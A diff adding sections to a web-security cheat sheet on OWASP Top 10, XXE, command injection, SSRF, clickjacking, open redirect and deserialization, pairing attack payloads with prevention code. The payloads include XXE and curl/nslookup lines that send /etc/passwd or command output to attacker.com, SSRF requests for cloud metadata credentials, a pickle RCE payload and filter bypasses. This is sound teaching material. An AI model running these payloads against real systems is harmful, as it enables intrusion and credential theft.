@@ -8,6 +8,12 @@ Quick reference for web application security, OWASP Top 10, and common vulnerabi
 - [SQL Injection](#sql-injection)
 - [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
 - [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
+- [XXE (XML External Entity)](#xxe-xml-external-entity)
+- [Command Injection](#command-injection)
+- [SSRF (Server-Side Request Forgery)](#ssrf-server-side-request-forgery)
+- [Clickjacking](#clickjacking)
+- [Open Redirect](#open-redirect)
+- [Insecure Deserialization](#insecure-deserialization)
 - [Authentication & Session Management](#authentication--session-management)
 - [Security Misconfigurations](#security-misconfigurations)
 - [File Upload Vulnerabilities](#file-upload-vulnerabilities)
@@ -15,16 +21,232 @@ Quick reference for web application security, OWASP Top 10, and common vulnerabi
 
 ## 🔟 OWASP Top 10 (2021)
 
-1. **Broken Access Control** - Improper authorization
-2. **Cryptographic Failures** - Weak crypto, exposed data
-3. **Injection** - SQL, NoSQL, OS command injection
-4. **Insecure Design** - Missing security controls
-5. **Security Misconfiguration** - Default configs, unnecessary features
-6. **Vulnerable Components** - Outdated libraries
-7. **Identification & Authentication Failures** - Weak auth
-8. **Software & Data Integrity Failures** - Unsigned code, insecure CI/CD
-9. **Security Logging & Monitoring Failures** - Insufficient logging
-10. **Server-Side Request Forgery (SSRF)** - Internal resource access
+### 1. Broken Access Control
+**Risk**: Users can act outside their intended permissions.
+
+**Common Issues:**
+- Accessing resources by modifying URL (forced browsing)
+- Privilege escalation (acting as admin without being logged in)
+- Insecure Direct Object References (IDOR)
+- Missing access control for POST, PUT, DELETE
+- Elevation of privilege (e.g., acting as another user)
+
+**Example Attack:**
+```
+# Normal user accesses admin panel
+http://example.com/admin/users
+http://example.com/user/profile?id=123  # Change id to access other users
+
+# API manipulation
+GET /api/users/123  # Access other user's data
+DELETE /api/users/456  # Delete other users
+```
+
+**Prevention:**
+```python
+# Implement proper access control
+@app.route('/admin/users')
+@login_required
+@admin_required
+def admin_users():
+    if not current_user.is_admin:
+        abort(403)  # Forbidden
+    return render_template('admin/users.html')
+
+# Check ownership
+@app.route('/user/profile/<int:user_id>')
+@login_required
+def user_profile(user_id):
+    if current_user.id != user_id and not current_user.is_admin:
+        abort(403)
+    user = User.query.get_or_404(user_id)
+    return render_template('profile.html', user=user)
+```
+
+### 2. Cryptographic Failures
+**Risk**: Sensitive data exposure through weak or missing encryption.
+
+**Common Issues:**
+- Transmitting sensitive data in clear text (HTTP instead of HTTPS)
+- Using weak cryptographic algorithms (MD5, SHA1)
+- Improper key management
+- Not encrypting sensitive data at rest
+
+**Example Attack:**
+```bash
+# Intercept unencrypted traffic
+tcpdump -i eth0 -A | grep -i 'password'
+
+# Crack weak hashes
+hashcat -m 0 -a 0 hashes.txt wordlist.txt  # MD5
+john --format=Raw-MD5 hashes.txt
+```
+
+**Prevention:**
+```python
+# Use HTTPS only
+app.config['SESSION_COOKIE_SECURE'] = True
+app.config['SESSION_COOKIE_HTTPONLY'] = True
+app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
+
+# Encrypt sensitive data
+from cryptography.fernet import Fernet
+key = Fernet.generate_key()
+cipher = Fernet(key)
+encrypted_data = cipher.encrypt(b"sensitive data")
+
+# Use strong hashing for passwords
+import bcrypt
+password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
+```
+
+### 3. Injection
+**Risk**: Malicious data sent to interpreter as part of command or query.
+
+**Types:**
+- SQL Injection (SQLi)
+- NoSQL Injection
+- OS Command Injection
+- LDAP Injection
+- XPath Injection
+
+**See detailed sections below for SQL Injection and XSS.**
+
+### 4. Insecure Design
+**Risk**: Missing or ineffective security controls in design phase.
+
+**Common Issues:**
+- Unlimited password attempts
+- No rate limiting
+- Trust boundary violations
+- Missing security requirements in design
+
+**Prevention:**
+```python
+# Implement rate limiting
+from flask_limiter import Limiter
+limiter = Limiter(app, key_func=lambda: request.remote_addr)
+
+@app.route('/login', methods=['POST'])
+@limiter.limit("5 per minute")
+def login():
+    # Login logic with account lockout
+    user = User.query.filter_by(username=username).first()
+    if user.failed_attempts >= 5:
+        return "Account locked. Try again in 15 minutes."
+    # ... rest of login logic
+```
+
+### 5. Security Misconfiguration
+**Risk**: Insecure default configurations, incomplete setups, open cloud storage.
+
+**See detailed section below.**
+
+### 6. Vulnerable and Outdated Components
+**Risk**: Using components with known vulnerabilities.
+
+**Prevention:**
+```bash
+# Regular dependency scanning
+npm audit
+pip-audit
+snyk test
+
+# Keep dependencies updated
+npm update
+pip install --upgrade -r requirements.txt
+
+# Use Dependabot or Renovate for automated updates
+```
+
+### 7. Identification and Authentication Failures
+**Risk**: Broken authentication allowing attackers to compromise passwords, keys, or sessions.
+
+**See detailed section below for Authentication & Session Management.**
+
+### 8. Software and Data Integrity Failures
+**Risk**: Code and infrastructure that does not protect against integrity violations.
+
+**Common Issues:**
+- Unsigned software updates
+- Insecure deserialization
+- Using untrusted CDNs
+
+**Example Attack (Insecure Deserialization):**
+```python
+# VULNERABLE
+import pickle
+user_data = pickle.loads(base64.b64decode(cookie_data))
+
+# SAFE
+import json
+user_data = json.loads(cookie_data)
+```
+
+### 9. Security Logging and Monitoring Failures
+**Risk**: Insufficient logging allowing breaches to go undetected.
+
+**Prevention:**
+```python
+import logging
+
+# Configure comprehensive logging
+logging.basicConfig(
+    filename='app.log',
+    level=logging.INFO,
+    format='%(asctime)s %(levelname)s: %(message)s'
+)
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    if authenticate(username, password):
+        logging.info(f"Successful login: {username} from {request.remote_addr}")
+        return redirect('/dashboard')
+    else:
+        logging.warning(f"Failed login attempt: {username} from {request.remote_addr}")
+        return "Invalid credentials"
+```
+
+### 10. Server-Side Request Forgery (SSRF)
+**Risk**: Application fetching remote resources without validating user-supplied URL.
+
+**Example Attack:**
+```python
+# Vulnerable endpoint
+@app.route('/fetch')
+def fetch():
+    url = request.args.get('url')
+    response = requests.get(url)  # DANGEROUS!
+    return response.content
+
+# Attack
+http://example.com/fetch?url=http://localhost:6379/  # Access internal Redis
+http://example.com/fetch?url=file:///etc/passwd  # Read local files
+http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/  # AWS metadata
+```
+
+**Prevention:**
+```python
+# Whitelist allowed domains
+ALLOWED_DOMAINS = ['api.trusted.com', 'cdn.trusted.com']
+
+@app.route('/fetch')
+def fetch():
+    url = request.args.get('url')
+    parsed = urlparse(url)
+    
+    # Validate domain
+    if parsed.hostname not in ALLOWED_DOMAINS:
+        abort(400, "Invalid URL")
+    
+    # Validate scheme
+    if parsed.scheme not in ['http', 'https']:
+        abort(400, "Invalid scheme")
+    
+    response = requests.get(url, timeout=5)
+    return response.content
+```
 
 ## 💉 SQL Injection
 
@@ -299,6 +521,449 @@ if (!str_starts_with($_SERVER['HTTP_REFERER'], 'https://yoursite.com/')) {
 }
 ```
 
+## 🔀 XXE (XML External Entity)
+
+### What is XXE?
+XML External Entity attacks exploit vulnerable XML parsers that process external entity references.
+
+### Attack Examples
+
+**Basic XXE (File Disclosure):**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+```
+
+**XXE to SSRF:**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM "http://internal-server/admin">
+]>
+<foo>&xxe;</foo>
+```
+
+**Blind XXE (Out-of-Band):**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+  %xxe;
+]>
+<foo>&exfil;</foo>
+```
+
+**evil.dtd:**
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+%eval;
+%exfil;
+```
+
+**Billion Laughs (DoS):**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<lolz>&lol4;</lolz>
+```
+
+### Prevention
+
+```python
+# Python - Disable external entities
+import defusedxml.ElementTree as ET
+tree = ET.parse('file.xml')
+
+# Java - Disable DTDs
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+
+# PHP - Disable external entities
+libxml_disable_entity_loader(true);
+
+# .NET - Secure settings
+XmlReaderSettings settings = new XmlReaderSettings();
+settings.DtdProcessing = DtdProcessing.Prohibit;
+```
+
+## 💻 Command Injection
+
+### Attack Examples
+
+**Basic Command Injection:**
+```bash
+# Vulnerable code: system("ping -c 4 " . $_GET['host']);
+
+# Payloads:
+; ls -la
+&& whoami
+| cat /etc/passwd
+`whoami`
+$(cat /etc/passwd)
+```
+
+**Command Chaining:**
+```bash
+; cat /etc/passwd
+&& cat /etc/passwd  # Execute if previous succeeds
+|| cat /etc/passwd  # Execute if previous fails
+| cat /etc/passwd   # Pipe output
+```
+
+**Blind Command Injection:**
+```bash
+# Time-based detection
+; sleep 10
+&& ping -c 10 127.0.0.1
+
+# Out-of-band
+; curl http://attacker.com?data=$(whoami)
+; nslookup `whoami`.attacker.com
+```
+
+**Bypass Filters:**
+```bash
+# Spaces
+cat</etc/passwd
+{cat,/etc/passwd}
+cat$IFS/etc/passwd
+
+# Quotes
+c'a't /etc/passwd
+c"a"t /etc/passwd
+
+# Backslashes
+c\at /etc/passwd
+
+# Wildcards
+cat /etc/pass*
+cat /???/passwd
+```
+
+### Prevention
+
+```python
+import subprocess
+import shlex
+
+# Use array instead of shell=True
+subprocess.run(['ping', '-c', '4', user_input])
+
+# Validate input
+if re.match(r'^[a-zA-Z0-9.-]+$', host):
+    subprocess.run(['ping', '-c', '4', host])
+```
+
+## 🌐 SSRF (Server-Side Request Forgery)
+
+### Attack Examples
+
+**Basic SSRF:**
+```
+http://example.com/fetch?url=http://localhost:22
+http://example.com/fetch?url=http://127.0.0.1:6379
+http://example.com/fetch?url=http://192.168.1.1/admin
+```
+
+**AWS Metadata:**
+```
+http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
+http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+**Cloud Metadata Services:**
+```bash
+# AWS
+http://169.254.169.254/latest/meta-data/
+
+# Google Cloud
+http://metadata.google.internal/computeMetadata/v1/
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+# DigitalOcean
+http://169.254.169.254/metadata/v1/
+```
+
+**File Protocol:**
+```
+http://example.com/fetch?url=file:///etc/passwd
+http://example.com/fetch?url=file:///var/www/config.php
+```
+
+**Bypass Filters:**
+```
+# Localhost variations
+http://127.0.0.1
+http://127.1
+http://0.0.0.0
+http://0177.0.0.1  (octal)
+http://2130706433  (decimal)
+http://[::1]       (IPv6)
+http://localhost.example.com  (DNS to 127.0.0.1)
+
+# URL encoding
+http://127.0.0.1 → http://127.0.0.%31
+
+# Domain tricks
+http://127.0.0.1.nip.io
+http://127.0.0.1.xip.io
+```
+
+### Prevention
+
+```python
+from urllib.parse import urlparse
+import ipaddress
+import socket
+
+ALLOWED_DOMAINS = ['api.trusted.com']
+
+def is_safe_url(url):
+    parsed = urlparse(url)
+    
+    # Check scheme
+    if parsed.scheme not in ['http', 'https']:
+        return False
+    
+    # Check domain whitelist
+    if parsed.hostname not in ALLOWED_DOMAINS:
+        return False
+    
+    # Resolve and check IP
+    try:
+        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
+        if ip.is_private or ip.is_loopback or ip.is_link_local:
+            return False
+    except Exception:
+        return False
+    
+    return True
+```
+
+## 🖱️ Clickjacking
+
+### Attack Examples
+
+**Basic Clickjacking:**
+```html
+<style>
+    iframe {
+        position: absolute;
+        width: 500px;
+        height: 500px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    button {
+        position: absolute;
+        top: 270px;
+        left: 180px;
+        z-index: 1;
+    }
+</style>
+
+<button>Click for Prize!</button>
+<iframe src="http://bank.com/transfer?to=attacker&amount=1000"></iframe>
+```
+
+**Likejacking:**
+```html
+<!-- Trick users into liking a Facebook page -->
+<iframe src="https://www.facebook.com/plugins/like.php?href=http://attacker.com"></iframe>
+```
+
+**Cursorjacking:**
+```html
+<style>
+    * { cursor: none; }
+    #fake-cursor {
+        position: absolute;
+        pointer-events: none;
+    }
+</style>
+<img id="fake-cursor" src="cursor.png">
+<script>
+    // Move fake cursor with offset
+    document.onmousemove = function(e) {
+        document.getElementById('fake-cursor').style.left = (e.pageX - 50) + 'px';
+        document.getElementById('fake-cursor').style.top = (e.pageY - 50) + 'px';
+    }
+</script>
+```
+
+### Prevention
+
+**X-Frame-Options Header:**
+```
+X-Frame-Options: DENY
+X-Frame-Options: SAMEORIGIN
+X-Frame-Options: ALLOW-FROM https://trusted.com
+```
+
+**Content Security Policy:**
+```
+Content-Security-Policy: frame-ancestors 'none'
+Content-Security-Policy: frame-ancestors 'self'
+Content-Security-Policy: frame-ancestors https://trusted.com
+```
+
+**Frame-busting JavaScript:**
+```javascript
+// Prevent framing
+if (top !== self) {
+    top.location = self.location;
+}
+```
+
+## 🔀 Open Redirect
+
+### Attack Examples
+
+**URL Parameter Redirect:**
+```
+http://example.com/redirect?url=http://evil.com
+http://example.com/redirect?next=/login  # Good
+http://example.com/redirect?next=//evil.com  # Bad
+```
+
+**Header-Based Redirect:**
+```
+http://example.com/redirect?url=https://evil.com
+```
+
+**Bypass Techniques:**
+```
+# Protocol-relative URL
+//evil.com
+
+# Whitelist bypass
+http://example.com@evil.com
+http://example.com.evil.com
+http://example.com/redirect?url=https://example.com.evil.com
+
+# URL encoding
+http://example.com/redirect?url=https%3A%2F%2Fevil.com
+
+# Open redirect chain
+http://trusted.com/redirect?url=http://example.com/redirect?url=http://evil.com
+```
+
+### Prevention
+
+```python
+from urllib.parse import urlparse
+
+ALLOWED_DOMAINS = ['example.com', 'app.example.com']
+
+@app.route('/redirect')
+def redirect_url():
+    url = request.args.get('url', '/')
+    
+    # Only allow relative URLs
+    if url.startswith('/') and not url.startswith('//'):
+        return redirect(url)
+    
+    # Or validate domain
+    parsed = urlparse(url)
+    if parsed.netloc in ALLOWED_DOMAINS:
+        return redirect(url)
+    
+    return abort(400, "Invalid redirect URL")
+```
+
+## 🔓 Insecure Deserialization
+
+### Attack Examples
+
+**Python Pickle:**
+```python
+# Malicious pickle payload
+import pickle
+import os
+
+class EvilClass:
+    def __reduce__(self):
+        return (os.system, ('whoami',))
+
+payload = pickle.dumps(EvilClass())
+# Send payload to vulnerable application
+
+# Vulnerable code:
+data = pickle.loads(user_input)  # DANGEROUS!
+```
+
+**Java Deserialization:**
+```java
+// Vulnerable code
+ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
+Object obj = ois.readObject();  // DANGEROUS!
+
+// Tools: ysoserial
+java -jar ysoserial.jar CommonsCollections1 'calc' | base64
+```
+
+**PHP Deserialization:**
+```php
+// Vulnerable code
+$data = unserialize($_COOKIE['data']);  // DANGEROUS!
+
+// Magic methods exploited:
+class Evil {
+    function __wakeup() {
+        system($this->cmd);
+    }
+}
+```
+
+**Node.js:**
+```javascript
+// Vulnerable code
+var obj = eval('(' + userInput + ')');  // DANGEROUS!
+
+// Or with node-serialize
+var serialize = require('node-serialize');
+var obj = serialize.unserialize(userInput);  // Can be dangerous
+```
+
+### Prevention
+
+```python
+# Use safe formats
+import json
+data = json.loads(user_input)  # Safe for data
+
+# Or validate signature
+import hmac
+import hashlib
+
+def serialize_secure(obj):
+    data = json.dumps(obj)
+    sig = hmac.new(SECRET_KEY, data.encode(), hashlib.sha256).hexdigest()
+    return base64.b64encode(f"{sig}:{data}".encode())
+
+def deserialize_secure(payload):
+    decoded = base64.b64decode(payload).decode()
+    sig, data = decoded.split(':', 1)
+    expected_sig = hmac.new(SECRET_KEY, data.encode(), hashlib.sha256).hexdigest()
+    if not hmac.compare_digest(sig, expected_sig):
+        raise ValueError("Invalid signature")
+    return json.loads(data)
+```
+
 ## 🔑 Authentication & Session Management
 
 ### Common Vulnerabilities
@@ -545,10 +1210,57 @@ wfuzz -w wordlist.txt -H "X-Forwarded-For: FUZZ" http://target.com
 
 ## 📚 Resources
 
-- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
-- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
-- [HackerOne Hacker101](https://www.hacker101.com/)
-- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
+### Learning Platforms
+- **[Hacksplaining](https://www.hacksplaining.com/lessons)** - Interactive security training covering:
+  - SQL Injection
+  - Cross-Site Scripting (XSS)
+  - CSRF
+  - Clickjacking
+  - XXE (XML External Entity)
+  - Command Injection
+  - Directory Traversal
+  - Subdomain Takeover
+  - Open Redirects
+  - And many more vulnerabilities
+- **[PortSwigger Web Security Academy](https://portswigger.net/web-security)** - Free online web security training with labs
+- **[OWASP WebGoat](https://owasp.org/www-project-webgoat/)** - Deliberately insecure application for learning
+- **[OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)** - Modern vulnerable web application
+- **[HackerOne Hacker101](https://www.hacker101.com/)** - Free security classes and CTF
+- **[DVWA](http://www.dvwa.co.uk/)** - Damn Vulnerable Web Application
+- **[bWAPP](http://www.itsecgames.com/)** - Buggy Web Application
+- **[Mutillidae](https://sourceforge.net/projects/mutillidae/)** - Vulnerable PHP web app
+
+### Practice Challenges
+- **[PentesterLab](https://pentesterlab.com/)** - Hands-on penetration testing exercises
+- **[HackTheBox](https://www.hackthebox.eu/)** - Penetration testing labs
+- **[TryHackMe](https://tryhackme.com/)** - Guided cybersecurity training
+- **[Root-Me](https://www.root-me.org/)** - 400+ hacking challenges
+- **[OverTheWire](https://overthewire.org/wargames/)** - Wargames for learning security
+
+### Official Documentation
+- **[OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)** - Comprehensive testing methodology
+- **[OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)** - Security implementation cheat sheets
+- **[OWASP Top 10](https://owasp.org/www-project-top-ten/)** - Most critical web application security risks
+- **[CWE Top 25](https://cwe.mitre.org/top25/)** - Most dangerous software weaknesses
+
+### Bug Bounty Platforms
+- **[HackerOne](https://www.hackerone.com/)** - Bug bounty and vulnerability coordination
+- **[Bugcrowd](https://www.bugcrowd.com/)** - Crowdsourced cybersecurity
+- **[Intigriti](https://www.intigriti.com/)** - European bug bounty platform
+- **[YesWeHack](https://www.yeswehack.com/)** - Bug bounty and VDP platform
+
+### Tools & Extensions
+- **[Burp Suite](https://portswigger.net/burp)** - Web vulnerability scanner
+- **[OWASP ZAP](https://www.zaproxy.org/)** - Free security testing tool
+- **[Wappalyzer](https://www.wappalyzer.com/)** - Technology profiler extension
+- **[FoxyProxy](https://getfoxyproxy.org/)** - Proxy management extension
+- **[Cookie-Editor](https://cookie-editor.cgagnier.ca/)** - Cookie manipulation
+
+### Books & Reading
+- **"The Web Application Hacker's Handbook"** by Stuttard & Pinto
+- **"Real-World Bug Hunting"** by Peter Yaworski
+- **"Web Hacking 101"** by Peter Yaworski
+- **"The Tangled Web"** by Michal Zalewski
 
 ---
 
